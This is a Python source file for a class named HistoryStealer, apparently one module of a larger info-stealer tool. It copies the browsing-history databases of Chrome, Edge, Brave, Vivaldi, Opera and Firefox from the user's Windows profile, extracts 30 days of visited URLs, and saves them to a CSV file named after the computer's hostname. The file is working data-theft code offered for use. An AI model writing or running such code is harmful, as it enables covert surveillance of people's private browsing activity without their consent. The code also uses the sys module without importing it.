import os
import shutil
import sqlite3
import csv
import logging
import socket
import glob
from datetime import datetime, timedelta

class HistoryStealer:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        self.base_dir = os.path.dirname(os.path.abspath(__file__)) if not getattr(os, 'frozen', False) else os.path.dirname(sys.executable)
        self.temp_dir = os.path.join(self.output_dir, "temp_history")
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(self.temp_dir, exist_ok=True)
        
        # Configure local paths
        self.username = os.getlogin()
        self.local_app_data = os.getenv('LOCALAPPDATA')
        self.roaming_app_data = os.getenv('APPDATA')

    def setup_logging(self):
        # We assume logging is configured by the caller (main.py)
        pass

    def get_real_path(self, pattern):
        """Resolve glob pattern to the first existing file."""
        matches = glob.glob(pattern)
        if matches:
            return matches[0]
        return None

    def extract_chromium_history(self, cursor, start_ts):
        query = """
            SELECT urls.url, urls.title, visits.visit_time, urls.visit_count
            FROM visits
            JOIN urls ON visits.url = urls.id
            WHERE visits.visit_time >= ?
            ORDER BY visits.visit_time DESC
        """
        cursor.execute(query, (start_ts,))
        return cursor.fetchall()

    def extract_firefox_history(self, cursor, start_ts):
        query = """
            SELECT moz_places.url, moz_places.title, moz_historyvisits.visit_date, moz_places.visit_count
            FROM moz_historyvisits
            JOIN moz_places ON moz_historyvisits.place_id = moz_places.id
            WHERE moz_historyvisits.visit_date >= ?
            ORDER BY moz_historyvisits.visit_date DESC
        """
        cursor.execute(query, (start_ts,))
        return cursor.fetchall()

    def run(self):
        # Browser Configs
        browser_configs = [
            {
                "name": "Chrome",
                "path": os.path.join(self.local_app_data, r"Google\Chrome\User Data\Default\History"),
                "type": "chromium"
            },
            {
                "name": "Edge",
                "path": os.path.join(self.local_app_data, r"Microsoft\Edge\User Data\Default\History"),
                "type": "chromium"
            },
            {
                "name": "Brave",
                "path": os.path.join(self.local_app_data, r"BraveSoftware\Brave-Browser\User Data\Default\History"),
                "type": "chromium"
            },
            {
                "name": "Vivaldi",
                "path": os.path.join(self.local_app_data, r"Vivaldi\User Data\Default\History"),
                "type": "chromium"
            },
            {
                "name": "Opera",
                "path": os.path.join(self.roaming_app_data, r"Opera Software\Opera Stable\History"),
                "type": "chromium"
            },
            {
                "name": "Firefox",
                "path": os.path.join(self.roaming_app_data, r"Mozilla\Firefox\Profiles\*.default-release\places.sqlite"),
                "type": "firefox"
            }
        ]

        # Date Setup
        end_date = datetime.now()
        start_date = end_date - timedelta(days=30)
        chrome_epoch = datetime(1601, 1, 1)
        chrome_start_ts = int((start_date - chrome_epoch).total_seconds() * 1_000_000)
        
        firefox_epoch = datetime(1970, 1, 1)
        firefox_start_ts = int((start_date - firefox_epoch).total_seconds() * 1_000_000)

        # Output File
        pc_name = socket.gethostname()
        date_str = end_date.strftime("%d-%m-%y")
        output_filename = f"Reports-of_({pc_name})_{date_str}.csv"
        output_file_path = os.path.join(self.output_dir, output_filename)
        
        csv_header = ["Browser", "Visit Time", "URL", "Title", "Visit Count"]

        try:
            with open(output_file_path, mode="w", newline="", encoding="utf-8") as csvfile:
                writer = csv.writer(csvfile)
                writer.writerow(csv_header)

                for browser in browser_configs:
                    name = browser["name"]
                    path_pattern = browser["path"]
                    browser_type = browser["type"]

                    real_path = self.get_real_path(path_pattern)
                    
                    if not real_path or not os.path.exists(real_path):
                        logging.warning(f"Browser history not found for: {name}")
                        continue

                    logging.info(f"Processing {name} from: {real_path}")
                    temp_history_db = os.path.join(self.temp_dir, f"{name}_History_Copy")

                    try:
                        shutil.copy2(real_path, temp_history_db)
                        conn = sqlite3.connect(temp_history_db)
                        cursor = conn.cursor()
                        
                        rows = []
                        if browser_type == "chromium":
                            raw_rows = self.extract_chromium_history(cursor, chrome_start_ts)
                            for url, title, visit_time, visit_count in raw_rows:
                                visit_datetime = chrome_epoch + timedelta(microseconds=visit_time)
                                rows.append([name, visit_datetime.strftime("%Y-%m-%d %H:%M:%S"), url, title, visit_count])
                                
                        elif browser_type == "firefox":
                            raw_rows = self.extract_firefox_history(cursor, firefox_start_ts)
                            for url, title, visit_time, visit_count in raw_rows:
                                if title is None: title = ""
                                visit_datetime = firefox_epoch + timedelta(microseconds=visit_time)
                                rows.append([name, visit_datetime.strftime("%Y-%m-%d %H:%M:%S"), url, title, visit_count])

                        writer.writerows(rows)
                        logging.info(f"Extracted {len(rows)} records for {name}.")
                        conn.close()
                    except Exception as e:
                        logging.error(f"Failed to process {name}: {e}")
                    finally:
                        if os.path.exists(temp_history_db):
                            try: os.remove(temp_history_db)
                            except: pass
                            
            logging.info(f"Browsing history extraction complete. Saved to {output_file_path}")
        except Exception as e:
            logging.error(f"Fatal error in legacy browser script: {e}")
        finally:
             if os.path.exists(self.temp_dir):
                try: shutil.rmtree(self.temp_dir)
                except: pass

if __name__ == "__main__":
    # Standalone test
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    OUTPUT_DIR = os.path.join(BASE_DIR, "output")
    logging.basicConfig(level=logging.INFO)
    stealer = HistoryStealer(OUTPUT_DIR)
    stealer.run()
